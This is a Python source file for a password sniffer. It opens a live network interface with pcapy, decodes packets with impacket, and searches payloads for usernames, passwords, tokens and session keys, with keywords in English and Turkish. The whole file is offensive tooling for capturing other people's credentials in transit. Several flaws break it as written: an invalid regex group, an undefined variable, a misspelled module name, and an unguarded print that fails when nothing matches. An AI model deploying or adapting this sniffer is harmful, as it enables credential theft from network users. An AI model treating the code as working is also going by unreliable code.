#-*- coding:utf-8 -*-
from impacket.ImpactDecoder import EthDecoder,IPDecoder,TCPDecoder
import pcapy
import re
class Attacking(object):
    def __init__(self,iface,filter):
        self.iface=iface
        self.filter=filter
        self.eth=EthDecoder()
        self.ip=IPDecoder()
        self.tcp=TCPDecoder()
        self.patern=re.compile(r'''?F<found>(USER|USERNAME|KULLANICI|PASS|PASSWORD|PAROLA|SIFRE|SESSION_?KEY|ACCESS_?KEY|TOKEN)[=:\S].+\b''',re.MULTILINE|re.IGNORECASE)

    def handle_packs(self,hdr,data):
        ethpack=self.eth.decode(data)
        ippack=self.ip.decode(ethpack.get_data_as_string())
        tcppack=self.tcp.decode(ippack.get_data_as_string())
        payload=ip.get_data_as_string()
        mach=re.search(self.patern,payload)
        if not tcppack.get_SYN() and not tcppack.get_RST() and not tcppack.get_FIN() and mach and mach.groupdict()["found"]:
            print("%s : %d -> %s : %d"%(ippack.get_ip_src(),tcppack.get_th_sport(),ippack.get_ip_dst(),tcppack.get_th_dport()))
        print("\t %s \n"%(mach.groupdict()["found"]))
    def execute(self):
        pcap=pacpy.open_live(self.iface,1500,0,100)
        pcap.setfilter(self.filter)
        print("Sniffing passwords %s on "%self.iface)
        pcap.loop(0,self.handle_packs)

